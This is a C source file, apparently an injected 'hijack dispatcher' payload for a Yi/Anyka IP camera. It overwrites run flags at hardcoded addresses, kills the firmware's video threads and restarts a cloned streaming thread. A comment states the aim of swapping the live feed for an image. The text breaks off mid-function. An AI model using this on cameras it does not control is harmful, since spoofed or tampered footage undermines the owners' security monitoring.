#include <stdint.h>
#include <stddef.h>
#include <time.h>

#define VENC_TYPE_MAX_USER 32
#define ANYKA_THREAD_NORMAL_STACK_SIZE 0x32000
#define AK_FAILED -1
#define AK_SUCCESS 0
#define AK_FALSE 0
#define ENCODE_GRP_NUM 4

#define calloc_addr 0x19108
#define free_addr 0x1a1dc
#define sleep_addr 0x192a0
#define mssleep_addr 0x6de18
#define ak_print_addr 0x6d8ac 
#define time_addr 0x199a8
#define ak_venc_get_stream_addr 0x88594
#define ak_venc_release_stream_addr 0x887b0
#define ak_venc_get_fps_addr 0x86cd8
#define ak_venc_set_fps_addr 0x86d1c
#define platform_streamer_buffer_h264_addr 0x34f58

#define ak_thread_create_addr 0x6eb2c
#define ak_thread_exit_addr 0x6ecd8

#define yi_video_deinit_addr 0x31e40
#define ak_config_get_sys_video_addr 0x2384c
#define yi_venc_h264_init_addr 0x30fb8
#define ak_venc_set_method_addr 0x87df4
#define yi_venc_stream_init_addr 0x30e60
#define ak_thread_mutex_init_addr 0x6ecec
#define ak_thread_sem_init_addr 0x6ed00
#define ak_thread_sem_post_addr 0x1a0a4
#define ak_thread_sem_wait_addr 0x6ed10

// for yi_venc_stream_init
#define ak_venc_request_stream_addr 0x88160
#define ak_venc_set_iframe_addr 0x86ebc

// for ak_venc_request_stream
#define ak_thread_mutex_lock_addr 0x6ecf4
#define ak_vi_get_fps_addr 0x70678
#define ak_thread_mutex_unlock_addr 0x6ecf8
#define INIT_LIST_HEAD_addr 0x1a634
#define encode_thread_addr 0x86f74
#define capture_thread_addr 0x85da4
#define yi_live_video_thread_addr 0x31264

// for encode thread stuff
#define ak_get_ostime_addr 0x6de24
#define ak_diff_ms_time_addr 0x6df64
#define ak_vi_get_work_scene_addr 0x70ad0
#define VideoStream_Enc_enviroment_addr 0x1a224
#define list_del_init_addr 0x1a75c
#define ak_vi_release_frame_addr 0x70504
#define free_frame_addr 0x85b40

#define ak_vi_get_frame_addr 0x70208
#define set_encode_fps_addr 0x85c2c

#define fopen_addr 0x19900
#define fseek_addr 0x19f6c
#define ftell_addr 0x1a194
#define rewind_addr 0x19060
#define fclose_addr 0x1984c
#define malloc_addr 0x19498
#define fread_addr 0x19888

#define fast_memcpy_addr 0x19264
#define ak_thread_set_name_addr 0x6ed18

#define ak_thread_join_addr 0x6ecc8
#define list_del_addr 0x437e4

typedef    unsigned char          T_U8;       /* unsigned 8 bit integer */
typedef    unsigned short         T_U16;      /* unsigned 16 bit integer */
typedef    unsigned long          T_U32;      /* unsigned 32 bit integer */
typedef    signed char            T_S8;       /* signed 8 bit integer */
typedef    signed short           T_S16;      /* signed 16 bit integer */
typedef    signed long            T_S32;      /* signed 32 bit integer */
typedef    void                   T_VOID;     /* void */
typedef    unsigned long long     T_U64;       //64bit

#define SET_LIGHT_SWITCH_MODE_ADDR 0x3bfe8

typedef enum {
    YI_LIGHT_SWITCH_ALWAYS_OFF,
    YI_LIGHT_SWITCH_ALWAYS_ON,
    YI_LIGHT_SWITCH_AUTO_MODE
} YI_LIGHT_SWITCH_MODE;

enum video_dev_type {
	VIDEO_DEV0 = 0x00,
	VIDEO_DEV_NUM
};

typedef int yi_p2p_on_set_light_switch_mode_t(YI_LIGHT_SWITCH_MODE mode);

typedef struct {
    uint32_t id;
} ak_pthread_t;

typedef struct {
    uint8_t size[16];
} ak_sem_t;

typedef struct {
    uint8_t data[24];
} ak_mutex_t;

typedef struct {
    uint32_t count;
    uint8_t run_flag;
    uint8_t chn_id;
    ak_pthread_t tid;
    ak_sem_t sem;
    ak_mutex_t lock;
    void* venc_handle;
    void* stream_handle; // 56
} yi_request_video;

struct list_head {
	struct list_head *next, *prev; 
};

struct thread_arg {
	int cap_run;	//use for capture thread
	int enc_run;	//use for encode thread
	int sensor_pre_fps;
	void *vi_handle;
	struct list_head head_frame; //store capture frame, get by encode thread

	ak_pthread_t cap_tid;	 //thread need join
	ak_pthread_t enc_tid;	//thread need join
	ak_sem_t cap_sem;	//capture semaphore
	ak_sem_t enc_sem;	//encode semaphore
	ak_mutex_t lock;	//list operate lock

	struct list_head list; //hang to video_ctrl
};

struct stream_handle {
	void *vi_handle;
	void *enc_handle;
	int id;	//user id
};

struct encode_param {
	unsigned long width;		//real encode width, to be divisible by 4
	unsigned long height;		//real encode height, to be divisible by 4
	signed long   minqp;		//Dynamic bit rate parameter[20,25]
	signed long   maxqp;		//Dynamic bit rate parameter[45,50]
	signed long   fps;          //frame rate
	signed long   goplen;       //IP FRAME interval
	signed long   bps;	        //target bps
	uint32_t profile; 			//profile mode
	uint32_t use_chn;		//encode channel, 0: main, 1 sub
	uint32_t enc_grp;		//encode group
	uint32_t br_mode; 	//bitrate control mode, vbr or cbr
	uint32_t enc_out_type;	//encode output type, h264 or jpeg
};

enum video_work_scene {
	VIDEO_SCENE_UNKNOWN = -1,
	VIDEO_SCENE_INDOOR = 0x00,
	VIDEO_SCENE_OUTDOOR
};

typedef enum
{
	VIDEO_DRV_UNKNOWN = 0,
	VIDEO_DRV_H263,
	VIDEO_DRV_MPEG,
	VIDEO_DRV_FLV263,
	VIDEO_DRV_H264,
	VIDEO_DRV_RV,
	VIDEO_DRV_AVC1,
	VIDEO_DRV_MJPEG,
	VIDEO_DRV_MPEG2,
	VIDEO_DRV_H264DMX
}T_eVIDEO_DRV_TYPE;

typedef struct _VIDEO_ENC_ENC_RC
{
    T_S32 		qpHdr;        
    T_U32 		qpMin;  
    T_U32 		qpMax;         
    T_U32 		bitPerSecond;    
    T_U32 		gopLen;    
    T_S32		fixedIntraQp;	//为所有的intra帧设置QP     
    T_U32 		hrdCpbSize;      /* Size of Coded Picture Buffer in HRD (bits) */

    T_S32 		intraQpDelta;    /* Intra QP delta. intraQP = QP + intraQpDelta
                          * This can be used to change the relative quality
                          * of the Intra pictures or to lower the size
                          * of Intra pictures. [-12..12]
                          */
    T_S32 		mbQpAdjustment;  /* Encoder uses MAD thresholding to recognize
                          * macroblocks with least details. This value is
                          * used to adjust the QP of these macroblocks
                          * increasing the subjective quality. [-8..7]
                          */
} T_VIDEOLIB_ENC_RC;

typedef struct _VIDEOLIB_ENC_PARA
{
    T_S32 		skipPenalty;
    T_S32		interFavor;
    T_S32		intra16x16Favor;
    T_S32		intra4x4Favor;
    T_S32		chromaQPOffset;
    T_S32		diffMVPenalty4p;
    T_S32		diffMVPenalty1p;
    T_S32		minIQP;
    T_S32		maxIQP;
	T_S32		adjustment_area_pencent;
	T_S32		qp_up_bitsize_threshold1;
	T_S32		qp_up_delta1;
	T_S32		qp_up_bitsize_threshold2;
	T_S32		qp_up_delta2;
	T_S32		qp_up_bitsize_threshold3;
	T_S32		qp_up_delta3;
	T_S32		qp_down_bitsize_threshold1;
	T_S32		qp_down_delta1;
	T_S32		qp_down_bitsize_threshold2;
	T_S32		qp_down_delta2;
	T_S32		qp_down_bitsize_threshold3;
	T_S32		qp_down_delta3;
	T_S32		bps;
	T_S32		GOPlen;
	T_S32		fps;
	T_S32		mbRows_threshold;
	T_S32		quarterPixelMv;
	T_S32		qp_filter_k;
	T_S32		videomode;//1为VBR，2为CBR
	T_S32		model;//码率控制模式
	T_S32		Isize;//I 帧 大小控制
	T_S32		method;//强制I帧控制开关
	T_S32		ROIenable;//ROI 开启，1 enable ,0 disable
	T_S32		ROItop;
	T_S32		ROIbot;
	T_S32		ROIleft;
	T_S32		ROIright;
	T_S32		ROIDeltaQP;
	T_S32		movdetect;
	T_S32		buffoverflow;
	T_S32		new_mbadjust;
	T_VIDEOLIB_ENC_RC enc_rc;
	float 		pixel_level;
	T_S32		environment;
	T_S32		debug;

}T_VIDEOLIB_ENC_PARA;


struct ak_timeval {
	unsigned long sec;     /* seconds */
	unsigned long usec;    /* microseconds */
};

struct encode_group {
	int user_count;			//0-4: how many user under this encode group
	int req_ref;			//4-8: request reference count
	int user_map;			//8-c: request user bit map
	int capture_frames;		//c-10: capture frame, syn with system's camera device
	int encode_frames;		//10-14: encode frames
    int ts_offset;          //14-18
	unsigned long long frame_index;// 18-20: use to control frames per second
	unsigned long long smooth_index;// 20-28
	int ip_frame;			//28-2c: use to control encode I or P frame
	int reset_iframe;		//2c-30: 1 need reset, 0 needless
	int is_stream_mode;		//30-34: 1 stream mode, 0 sigle mode
	unsigned long long pre_ts;//timestamp(ms) !!!!!!!!!!!!!!!!
    // int dunno2;                 // !!!!!!!!!!!!!!!1
	void *lib_handle;	//40-44: encoder lib operate handle
	void *output;		//44-48: encode output buf
	void *encbuf;		//48-4c: (vlc data?) encode buf address // (decimal 68?)
	uint32_t grp_type;	//4c-50: group flag
	struct encode_param 	record; 	// 50-80 record encode param
	struct list_head 		stream_list;	//80-88: store stream 
	struct list_head 		enc_list;		//88-90: register encode handle list
	// T_VIDEOLIB_ENC_PARA enc_grp_param; //0x90-0x140 : encode gourp param // 
    uint8_t enc_grp_param[180];
	T_VIDEOLIB_ENC_RC video_rc;		//0x140-0x168? : encode rate control struct
    T_eVIDEO_DRV_TYPE drv_enc_type;	//168-16c: more detail see 'video_stream_lib.h'
    int dunno2;
	ak_mutex_t lock;				//16c-184: mutex lock // 0x16c in
	ak_mutex_t close_mutex;			//184-19C;close mutex
	int qp;                         //19c-1a0
	int streams_count;				//1a0-1a4: current queue has nodes number
	struct ak_timeval env_time;		//1a4-1ac: check work env time
	enum video_work_scene pre_scene;//1ac-1b0: previous scene
    int dunno3;                     //1b0-1b4
	void *mdinfo;	//1b4-1b8: pointer to md info
};

struct video_ctrl_handle {
	uint32_t module_init;	//module init flag
	ak_mutex_t lock;			//mutex lock

	int inited_enc_grp_num; // 4e1a4c-50
	int thread_group_num;
	struct encode_group *grp[ENCODE_GRP_NUM];	//use for stream encode ctrl

	ak_mutex_t cancel_mutex;	//cancel mutex
	struct list_head venc_list;
	struct list_head thread_list;
	int frame_num;
	struct ak_timeval calc_time;
	int stream_num;
	struct ak_timeval enc_time;
};

typedef enum {
    FRAME_TYPE_P,
    FRAME_TYPE_I,
    FRAME_TYPE_B,
    FRAME_TYPE_PI
} video_frame_type;

typedef struct {
    uint8_t* data;
    uint32_t len;
    uint64_t ts;
    uint32_t seq_no;
    video_frame_type frame_type;
} video_stream;

typedef struct {
    int min_qp;
    int max_qp;
    int v720p_fps;
    int v720p_min_kbps;
    int v720p_max_kbps;
    int vga_fps;
    int vga_min_kbps;
    int vga_max_kbps;
    int gop_len;
    int quality;
    int pic_ch;
    int video_mode;
    int method;
} video_config;

struct frame_thing {
	unsigned char *data;	//frame data
	unsigned int len;		//frame len in bytes
	unsigned long long ts;	//timestamp(ms)
	unsigned long seq_no;	//current frame sequence no.
};

struct video_input_frame {
	struct frame_thing vi_frame[2]; // check dis
	void *mdinfo;
};

struct frame_node {
	int bit_map;	//which group will use it
	struct video_input_frame *vframe;	//video frame pointer
	struct list_head list;				//frames list
};

#define container_of(ptr, type, member) ({			\
	const typeof( ((type *)0)->member ) *__mptr = (ptr);	\
	(type *)( (char *)__mptr - offsetof(type,member) );})

#define list_entry(ptr, type, member) \
	container_of(ptr, type, member)

#define list_for_each_entry_safe(pos, n, head, member)			\
	for (pos = list_entry((head)->next, typeof(*pos), member),	\
		n = list_entry(pos->member.next, typeof(*pos), member);	\
	     &pos->member != (head); 					\
	     pos = n, n = list_entry(n->member.next, typeof(*n), member))

#define list_for_each_entry(pos, head, member)				\
	for (pos = list_entry((head)->next, typeof(*pos), member);	\
	     &pos->member != (head); 	\
	     pos = list_entry(pos->member.next, typeof(*pos), member))

typedef int ak_thread_create_t(ak_pthread_t* id, void *routine, void* arguments, size_t stack_size, int priority);
typedef void ak_thread_exit_t();
typedef uint32_t sleep_t(uint32_t seconds);
typedef void* calloc_t(size_t nitems, size_t size);
typedef void free_t(void* ptr);
typedef uint32_t mssleep_t(uint32_t ms);
typedef time_t get_time_t(time_t* timer); 
typedef uint32_t ak_venc_get_fps_t(void* venc_handle);
typedef uint32_t ak_venc_set_fps_t(void* venc_handle, uint32_t value);
typedef uint8_t platform_streamer_buffer_h264_t(int id, uint8_t keyframe, uint64_t ts_ms, int fps, size_t offset, void* data, size_t datalen);
typedef uint32_t ak_venc_get_stream_t(void* stream_handle, video_stream* stream);
typedef uint32_t ak_venc_release_stream_t(void* stream_handle, video_stream* stream);
typedef uint32_t ak_printf_t(int level, char* format, ...);

typedef int yi_video_deinit_t();
typedef video_config* ak_config_get_sys_video_t();
typedef void* yi_venc_h264_init_t(int channel);
typedef int ak_venc_set_method_t(void* h264_handle, int method);
typedef void* yi_venc_stream_init_t(void* vi_handle, void* h264_handle);
typedef void ak_thread_mutex_init_t(void* address);
typedef void ak_thread_sem_init_t(void* address, int thing);
typedef void ak_thread_sem_post_t(void* address);
typedef void ak_thread_sem_wait_t(void* address);

// for yi_venc_stream_init
typedef void* ak_venc_request_stream_t(void* vi_handle, void* enc_handle);
typedef int ak_venc_set_iframe_t(void* enc_handle);

// for ak_venc_request_stream
typedef int ak_thread_mutex_lock_t(ak_mutex_t* mutex);
typedef int ak_thread_mutex_unlock_t(ak_mutex_t* mutex);
typedef int ak_vi_get_fps_t(void *handle);
typedef void INIT_LIST_HEAD_t(struct list_head* list);

// for encode thread
typedef void ak_get_ostime_t(struct ak_timeval *tv);
typedef long ak_diff_ms_time_t(const struct ak_timeval *cur_time,
					const struct ak_timeval *pre_time);
typedef enum video_work_scene ak_vi_get_work_scene_t(enum video_dev_type dev);
typedef void VideoStream_Enc_enviroment_t(void* lib_handle, void* param);
typedef void list_del_init_t(struct list_head* entry);
typedef int ak_vi_release_frame_t(void *handle, struct video_input_frame *frame);
typedef void free_frame_t(void* frame);

typedef int ak_vi_get_frame_t(void *handle, struct video_input_frame *frame);

typedef void set_encode_fps_t(struct encode_group *handle, int fps);

typedef int* fopen_t(const char *filename, const char *mode);
typedef int fseek_t(int* stream, long int offset, int whence);
typedef long ftell_t(int* stream);
typedef void rewind_t(int* stream);
typedef int fclose_t(int* stream);
typedef void* malloc_t(size_t size);
typedef size_t fread_t(void* buffer, size_t size, size_t count, int *stream);

typedef void* fast_memcpy_t(void* dst, void* src, size_t n);
typedef void ak_thread_set_name_t(const char* name);

typedef void ak_thread_join_t(ak_pthread_t tid);
typedef void list_del_t(struct list_head *entry);

void* bootleg_yi_live_video_thread(yi_request_video* arg);

void * bootleg_yi_venc_stream_init(void *vi_handle,void *venc_handle);

void *bootleg_ak_venc_request_stream(void *vi_handle, void *enc_handle);

static int start_service_work(void *vi);

// void *bootleg_encode_thread(void* arg);

// void bootleg_encode_frame(struct thread_arg *thread_arg);

// void check_work_scene_changed(struct encode_group *enc_handle);

// void frame_to_stream(struct encode_group *enc_handle,
// 							struct frame_node *pos);

void *bootleg_capture_thread(void *arg);

void *alloc_video_frame(void);

void capture_encode_frame(struct thread_arg *thread_arg);

int ak_vi_get_frame(void *handle, struct video_input_frame *frame);

void add_to_encode_list(struct thread_arg *thread_arg,
		struct frame_node *frame);

int frames_ctrl(int group_type, const int max_frame, 
					unsigned long long ts);

void calc_video_capture_frame(struct video_input_frame *vframe);

void encode_thread_group_exit(void);

void print_video_config(video_config config);

int _start(void) {
    // need to init functions here
    sleep_t *sleep = (sleep_t*) sleep_addr;
    ak_printf_t *printf = (ak_printf_t*) ak_print_addr;
    ak_thread_create_t *ak_thread_create = (ak_thread_create_t*) ak_thread_create_addr;
    ak_thread_exit_t *ak_thread_exit = (ak_thread_exit_t*) ak_thread_exit_addr;

    yi_video_deinit_t *yi_video_deinit = (yi_video_deinit_t*) yi_video_deinit_addr;
    ak_config_get_sys_video_t *ak_config_get_sys_video = (ak_config_get_sys_video_t*) ak_config_get_sys_video_addr;
    yi_venc_h264_init_t *yi_venc_h264_init = (yi_venc_h264_init_t*) yi_venc_h264_init_addr;
    ak_venc_set_method_t *ak_venc_set_method = (ak_venc_set_method_t*) ak_venc_set_method_addr;
    yi_venc_stream_init_t *yi_venc_stream_init = (yi_venc_stream_init_t*) yi_venc_stream_init_addr;
    ak_thread_mutex_init_t *ak_thread_mutex_init = (ak_thread_mutex_init_t*) ak_thread_mutex_init_addr;
    ak_thread_sem_init_t *ak_thread_sem_init = (ak_thread_sem_init_t*) ak_thread_sem_init_addr;
    ak_thread_sem_post_t *ak_thread_sem_post = (ak_thread_sem_post_t*) ak_thread_sem_post_addr;

    // first need to exit the current yi 
    // live video thread thing, do this by 
    // setting a flag to false, causing 
    // thread to exit

    printf(0x1, "Hijack dispatcher is running...\n");

    // kill the old stream thread as it is no longer needed
    int vi_run_flag = *(int*) 0x4b97a8;
    printf(0x1, "Current yi_av_ctrl.vi_run_flag: %d\n", vi_run_flag);
    int arg_run_flag = *(int*) 0x4b989c;
    printf(0x1, "Current arg->run_flag: %d\n", arg_run_flag);

    uint32_t* ak_yi_av_run_flag_addr = (uint32_t*) 0x4b97a8;
    *ak_yi_av_run_flag_addr = 0;
    uint32_t* arg_run_flag_addr = (uint32_t*) 0x4b989c;
    *arg_run_flag_addr = 0;
    sleep(0.5);

    printf(0x1, "Old stream thread should be dead now...\n");

    printf(0x1, "Killing off old capture and encode threads...\n");
    encode_thread_group_exit();

    uint32_t* inited_enc_grp_num_addr = (uint32_t*)0x4e1a4c;
    printf(0x2, "inited_enc_grp_num %d\n", *inited_enc_grp_num_addr);

    // now call deinit to reset all the stuff
    yi_video_deinit();

    // now reinitialise everything
    video_config* vid_config = ak_config_get_sys_video();
    print_video_config(*vid_config);
    vid_config->quality = 0;
    void* h264_handle = yi_venc_h264_init(0x1); // channel 1
    ak_venc_set_method(h264_handle, vid_config->method);
    void* vi_handle = (void*)(*(uint32_t*)0x4b9a9c);
    void* stream_handle = bootleg_yi_venc_stream_init(vi_handle, h264_handle);

    // yi_av_ctrl shit
    *ak_yi_av_run_flag_addr = 1;
    *arg_run_flag_addr = 1;

    uint32_t* ak_yi_av_stream_handle_addr = (uint32_t*) 0x4b98d0;
    *ak_yi_av_stream_handle_addr = (uint32_t) stream_handle;
    uint32_t* ak_yi_av_venc_handle_addr = (uint32_t*)0x4b98cc;
    *ak_yi_av_venc_handle_addr = (uint32_t)h264_handle;
    uint32_t* ak_yi_av_cnh_id_addr = (uint32_t*) 0x4b989d;
    *ak_yi_av_cnh_id_addr = 1;

    // last lot of functions
    ak_thread_mutex_init((void*) 0x4b98b4);
    ak_thread_sem_init((void*) 0x4b98a4, 0);
    ak_thread_sem_post((void*) 0x4b98a4);

    // now create a new thread with our modified function
    ak_thread_create((ak_pthread_t*) 0x4b98a0, (void*) bootleg_yi_live_video_thread, (uint32_t*) 0x4b9898, 0x32000, 0xffffffff);

    // don't need this thread anymore
    printf(0x1, "Exiting hijack dispatcher thread\n");
    ak_thread_exit();
}

void print_video_config(video_config config) {
    ak_printf_t *printf = (ak_printf_t*) ak_print_addr;

    printf(0x1, "min_qp: %d\n", config.min_qp);
    printf(0x1, "max_qp: %d\n", config.max_qp);
    printf(0x1, "v720p_fps: %d\n", config.v720p_fps);
    printf(0x1, "v720p_min_kbps: %d\n", config.v720p_min_kbps);
    printf(0x1, "v720p_max_kbps: %d\n", config.v720p_max_kbps);
    printf(0x1, "vga_fps: %d\n", config.vga_fps);
    printf(0x1, "vga_min_kbps: %d\n", config.vga_min_kbps);
    printf(0x1, "vga_max_kbps: %d\n", config.vga_max_kbps);
    printf(0x1, "gop_len: %d\n", config.gop_len);
    printf(0x1, "quality: %d\n", config.quality);
    printf(0x1, "pic_ch: %d\n", config.pic_ch);
    printf(0x1, "video_mode: %d\n", config.video_mode);
    printf(0x1, "method: %d\n", config.method);
}

// this forces the capture/encode threads to die
void encode_thread_group_exit(void)
{
    ak_thread_sem_post_t *ak_thread_sem_post = (ak_thread_sem_post_t*) ak_thread_sem_post_addr;
    ak_thread_mutex_lock_t *ak_thread_mutex_lock = (ak_thread_mutex_lock_t*) ak_thread_mutex_lock_addr;
    ak_thread_mutex_unlock_t *ak_thread_mutex_unlock = (ak_thread_mutex_unlock_t*) ak_thread_mutex_unlock_addr;
    ak_thread_join_t *ak_thread_join = (ak_thread_join_t*) ak_thread_join_addr;
    list_del_t *list_del = (list_del_t*) list_del_addr;
    free_t *free = (free_t*) free_addr;

	// ak_print_info_ex("enter, inited_enc_grp_num=%d\n",
	// 	video_ctrl.inited_enc_grp_num);
	/*
	 * All encode has close, so we close all thread group.
	 * Now it is cancel only one thread group, close specific
	 * thread group is not implement.
	 */

    struct video_ctrl_handle* video_ctrl = (struct video_ctrl_handle*) 0x4e1a30;  

	// if (!video_ctrl->inited_enc_grp_num) {
		struct thread_arg *arg, *n;

		list_for_each_entry_safe(arg, n, &video_ctrl->thread_list, list) {
			arg->cap_run = 0;
			ak_thread_sem_post(&arg->cap_sem);
			// ak_print_normal_ex("join capture thread, tid=%lu\n", arg->cap_tid);
			ak_thread_join(arg->cap_tid);
			// ak_print_notice_ex("join capture thread OK\n");

			arg->enc_run = 0;
			ak_thread_sem_post(&arg->enc_sem);
			// ak_print_normal_ex("join encode thread, tid=%lu\n", arg->enc_tid);
			ak_thread_join(arg->enc_tid);
			// ak_print_notice_ex("join encode thread OK\n");

			list_del(&arg->list);
			free(arg);
			arg = NULL;

			// ak_print_info_ex("free thread arg OK\n");
			ak_thread_mutex_lock(&video_ctrl->lock);
			video_ctrl->thread_group_num--;
			ak_thread_mutex_unlock(&video_ctrl->lock);
		}
	// }
	// ak_print_info_ex("leave ...\n");
}

void* memcpy(void* dest, const void* src, size_t n) {
    unsigned char* d = dest;
    const unsigned char* s = src;

    // Copy bytes from source to destination
    while (n--) {
        *d++ = *s++;
    }

    return dest;
}

void * bootleg_yi_venc_stream_init(void *vi_handle,void *venc_handle){
	ak_venc_request_stream_t *ak_venc_request_stream = (ak_venc_request_stream_t*) ak_venc_request_stream_addr;
	ak_venc_set_iframe_t *ak_venc_set_iframe = (ak_venc_set_iframe_t*) ak_venc_set_iframe_addr;

	void* ret = bootleg_ak_venc_request_stream(vi_handle, venc_handle);
	int ret2 = ak_venc_set_iframe(venc_handle);

	return ret;
}

static inline void set_bit(int *flag, unsigned char bit)
{
    *flag |= (1 << bit);
}

static inline int test_bit(int nr, volatile void *addr)
{
    return (1UL & (((const int *) addr)[nr >> 5] >> (nr & 31))) != 0UL;
}

static inline void add_ref(int *ref, int val)
{
    *ref += val;
}

static inline void del_ref(int *ref, int val)
{
    *ref -= val;
}

static inline int list_empty(const struct list_head *head) 
{ 
	return head->next == head; 
} 

static inline void __list_add(struct list_head *new_entry, 
       struct list_head *prev, 
       struct list_head *next) 
{ 
	next->prev = new_entry; 
	new_entry->next = next; 
	new_entry->prev = prev; 
	prev->next = new_entry;
} 

static inline void list_add_tail(struct list_head *new_entry, struct list_head *head) 
{ 
	__list_add(new_entry, head->prev, head); 
} 

// idea is to take the yi_live_video_thread, clone it, 
// but modify the data retrieved from get_video_stream 
// to be an image instead
void* bootleg_yi_live_video_thread(yi_request_video* arg){
    ak_printf_t *printf = (ak_printf_t*) ak_print_addr;
    sleep_t *sleep = (sleep_t*) sleep_addr;
    mssleep_t *mssleep = (mssleep_t*) mssleep_addr;
    get_time_t *get_time = (get_time_t*) time_addr;
    ak_venc_get_stream_t *ak_venc_get_stream = (ak_venc_get_stream_t*) ak_venc_get_stream_addr;
    ak_venc_release_stream_t *ak_venc_release_stream = (ak_venc_release_stream_t*) ak_venc_release_stream_addr;
    ak_venc_get_fps_t *ak_venc_get_fps = (ak_venc_get_fps_t*) ak_venc_get_fps_addr;
    ak_venc_set_fps_t *ak_venc_set_fps = (ak_venc_set_fps_t*) ak_venc_set_fps_addr; 
	platform_streamer_buffer_h264_t *platform_streamer_buffer_h264 = (platform_streamer_buffer_h264_t*) platform_streamer_buffer_h264_addr;
	ak_venc_set_iframe_t *ak_venc_set_iframe = (ak_venc_set_iframe_t*) ak_venc_set_iframe_addr;

    printf(0x1, "Now running bootleg_yi_live_video_thread!\n");

    uint32_t* arg_run_flag_addr = (uint32_t*) 0x4b989c;
    *arg_run_flag_addr = 1;

    video_stream stream;

    printf(0x1, "Setting run flag\n");
    uint32_t* ak_yi_av_run_flag_addr = (uint32_t*) 0x4b97a8;
    *ak_yi_av_run_flag_addr = 1;

    sleep(1);

    printf(0x1, "Current vi_run_flag: %d\n", *ak_yi_av_run_flag_addr);

    printf(0x1, "Entering loop\n");

	ak_venc_set_fps(arg->venc_handle, 15);

	time_t i_cnt = 0;

    while (arg->run_flag != 0){
        time_t current_time = get_time((time_t) 0x0);
		if (current_time / 0x3c != i_cnt){
			uint32_t* g_switchFileTime_addr = (uint32_t*) 0x4b98d8;
			*g_switchFileTime_addr = current_time;

			ak_venc_set_iframe(arg->venc_handle);
			i_cnt = current_time / 0x3c;
		}

        if (ak_venc_get_stream(arg->stream_handle, &stream) == 0){
			uint32_t fps = ak_venc_get_fps(arg->venc_handle);
            platform_streamer_buffer_h264(1, stream.frame_type, stream.ts, fps, 0x20, stream.data, stream.len); // using normal stuff to check everything works as expected
            ak_venc_release_stream(arg->stream_handle, &stream);
            mssleep(5);
        } else {
            mssleep(10);
        }
    }
}

void *bootleg_ak_venc_request_stream(void *vi_handle, void *enc_handle){
    ak_thread_mutex_lock_t *ak_thread_mutex_lock = (ak_thread_mutex_lock_t*) ak_thread_mutex_lock_addr;
    ak_thread_mutex_unlock_t *ak_thread_mutex_unlock = (ak_thread_mutex_unlock_t*) ak_thread_mutex_unlock_addr;
    ak_vi_get_fps_t *ak_vi_get_fps = (ak_vi_get_fps_t*) ak_vi_get_fps_addr;
    INIT_LIST_HEAD_t *INIT_LIST_HEAD = (INIT_LIST_HEAD_t*) INIT_LIST_HEAD_addr;
    calloc_t *calloc = (calloc_t*) calloc_addr;
    free_t *free = (free_t*) free_addr;
    ak_printf_t *printf = (ak_printf_t*) ak_print_addr;
    sleep_t *sleep = (sleep_t*) sleep_addr;

    yi_p2p_on_set_light_switch_mode_t *yi_p2p_on_set_light_switch_mode = (yi_p2p_on_set_light_switch_mode_t *) SET_LIGHT_SWITCH_MODE_ADDR;

	struct stream_handle *new_handle = (struct stream_handle *)calloc(1, sizeof(struct stream_handle));
	struct encode_group *handle = (struct encode_group *)enc_handle;
	ak_thread_mutex_lock(&handle->lock);
	int i = 0;
	for (i = 0; i < VENC_TYPE_MAX_USER; ++i) {
		if (!test_bit(i, &(handle->user_map))) {
			new_handle->id = i;
			break;
		}
	}
	new_handle->vi_handle = vi_handle;
	new_handle->enc_handle = enc_handle;
    set_bit(&(handle->user_map), new_handle->id);    
	add_ref(&(handle->req_ref), 1);

    struct video_ctrl_handle* video_ctrl = (struct video_ctrl_handle*) 0x4e1a30;  

	/* if this is first request on current group, initialize as below */
	if (handle->is_stream_mode == 1) {
        handle->capture_frames = ak_vi_get_fps(vi_handle);
        handle->encode_frames = handle->record.fps;
        if (handle->capture_frames < handle->record.fps){
            handle->encode_frames = handle->capture_frames;
        }
		handle->frame_index = 0;
        handle->ts_offset = 0;
		handle->streams_count = 0;
		handle->is_stream_mode = 2;

		video_ctrl->inited_enc_grp_num++;
		list_add_tail(&handle->enc_list, &video_ctrl->venc_list);  // dies here
	}
	ak_thread_mutex_unlock(&handle->lock);

	/* each unique video input device, create one service thread group */
	if (video_ctrl->module_init && (!video_ctrl->thread_group_num)) {
	    INIT_LIST_HEAD(&video_ctrl->thread_list);
	}

	if (start_service_work(vi_handle)) {
		free(new_handle);
		new_handle = NULL;
	}

	return new_handle;
}

static int start_service_work(void *vi)
{
    ak_printf_t *printf = (ak_printf_t*) ak_print_addr;
    sleep_t *sleep = (sleep_t*) sleep_addr;

    ak_thread_sem_init_t *ak_thread_sem_init = (ak_thread_sem_init_t*) ak_thread_sem_init_addr;
    calloc_t *calloc = (calloc_t*) calloc_addr;
    ak_thread_mutex_init_t *ak_thread_mutex_init = (ak_thread_mutex_init_t*) ak_thread_mutex_init_addr;
    INIT_LIST_HEAD_t *INIT_LIST_HEAD = (INIT_LIST_HEAD_t*) INIT_LIST_HEAD_addr;
    ak_thread_mutex_lock_t *ak_thread_mutex_lock = (ak_thread_mutex_lock_t*) ak_thread_mutex_lock_addr;
    ak_thread_mutex_unlock_t *ak_thread_mutex_unlock = (ak_thread_mutex_unlock_t*) ak_thread_mutex_unlock_addr;
    ak_thread_sem_post_t *ak_thread_sem_post = (ak_thread_sem_post_t*) ak_thread_sem_post_addr;
    ak_thread_create_t *ak_thread_create = (ak_thread_create_t*) ak_thread_create_addr;

    yi_p2p_on_set_light_switch_mode_t *yi_p2p_on_set_light_switch_mode = (yi_p2p_on_set_light_switch_mode_t *) SET_LIGHT_SWITCH_MODE_ADDR;

	struct thread_arg *arg;

    struct video_ctrl_handle* video_ctrl = (struct video_ctrl_handle*) 0x4e1a30;  

	arg = (struct thread_arg *)calloc(1, sizeof(struct thread_arg));
	if (!arg) {
		return AK_FAILED;
	}

	ak_thread_sem_init(&arg->cap_sem, 0);
	ak_thread_sem_init(&arg->enc_sem, 0);
	ak_thread_mutex_init(&arg->lock);
	INIT_LIST_HEAD(&arg->head_frame);		//store frame

	list_add_tail(&arg->list, &video_ctrl->thread_list);

	arg->vi_handle = vi;
	arg->cap_run = 1;
	arg->enc_run = 1;

	ak_thread_create(&arg->cap_tid, bootleg_capture_thread, (void *)arg,
		ANYKA_THREAD_NORMAL_STACK_SIZE, 90);

	ak_thread_create(&arg->enc_tid, (void*) encode_thread_addr, (void *)arg,
		ANYKA_THREAD_NORMAL_STACK_SIZE, 90);

	ak_thread_mutex_lock(&video_ctrl->lock);
	video_ctrl->thread_group_num++;	//record thread group number
	ak_thread_mutex_unlock(&video_ctrl->lock);

	/* notify, start to capture and encode */
	ak_thread_sem_post(&arg->cap_sem);

	return 0;
}


void *bootleg_capture_thread(void *arg){
